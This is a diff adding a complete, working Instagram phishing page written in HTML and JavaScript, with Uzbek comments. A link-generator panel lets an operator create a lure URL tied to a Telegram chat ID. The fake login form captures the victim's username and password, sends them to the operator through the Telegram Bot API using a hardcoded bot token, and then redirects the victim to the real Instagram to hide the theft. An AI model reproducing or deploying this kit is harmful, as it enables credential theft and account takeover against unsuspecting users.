@@ -1,0 +1,80 @@
+ <!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .logo { width: 150px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 5px; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        .result { background: #eef; padding: 10px; border-radius: 5px; word-break: break-all; font-size: 13px; margin-top: 15px; display: none; border: 1px dashed #3390ec; }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="mainBox">
+        </div>
+
+    <script>
+        // 1. O'zgartirishingiz kerak bo'lgan yagona narsa - BOT TOKEN
+        const BOT_TOKEN = "8429550175:AAGixNfnMTH8wDwLa6VeNnQ3dR3YZBP9gek"; 
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id');
+        const mainBox = document.getElementById('mainBox');
+
+        if (targetId) {
+            // --- FISHING REJIMI ---
+            mainBox.innerHTML = `
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+                <input type="text" id="login" placeholder="Login yoki Email" required>
+                <input type="password" id="pass" placeholder="Parol" required>
+                <button onclick="sendData()">Kirish</button>
+            `;
+        } else {
+            // --- PANEL REJIMI (Link yaratish) ---
+            mainBox.innerHTML = `
+                <h3>Havola Yaratish</h3>
+                <p style="font-size:13px; color:#666;">Chat ID-ingizni kiriting va link oling:</p>
+                <input type="text" id="chat_id_input" placeholder="Masalan: 1234567">
+                <button onclick="generate()">Linkni olish</button>
+                <div id="res" class="result"></div>
+            `;
+        }
+
+        // Ma'lumotni Telegramga yuborish funksiyasi
+        async function sendData() {
+            const login = document.getElementById('login').value;
+            const pass = document.getElementById('pass').value;
+            
+            const message = `📸 **INSTA NATIJA!**\n\n👤 Login: \`${login}\`\n🔑 Parol: \`${pass}\`\n🆔 Target ID: \`${targetId}\``;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${targetId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            
+            try {
+                await fetch(url);
+                window.location.href = "https://instagram.com"; // Chalg'itish
+            } catch (e) {
+                alert("Xatolik yuz berdi!");
+            }
+        }
+
+        // Link yaratish funksiyasi
+        function generate() {
+            const id = document.getElementById('chat_id_input').value;
+            if (id.length > 5) {
+                const currentUrl = window.location.href.split('?')[0];
+                const finalLink = currentUrl + "?id=" + id;
+                const resDiv = document.getElementById('res');
+                resDiv.style.display = "block";
+                resDiv.innerHTML = "<b>Sizning linkigiz:</b><br>" + finalLink;
+            } else {
+                alert("ID xato!");
+            }
+        }
+    </script>
+</body>
+</html>
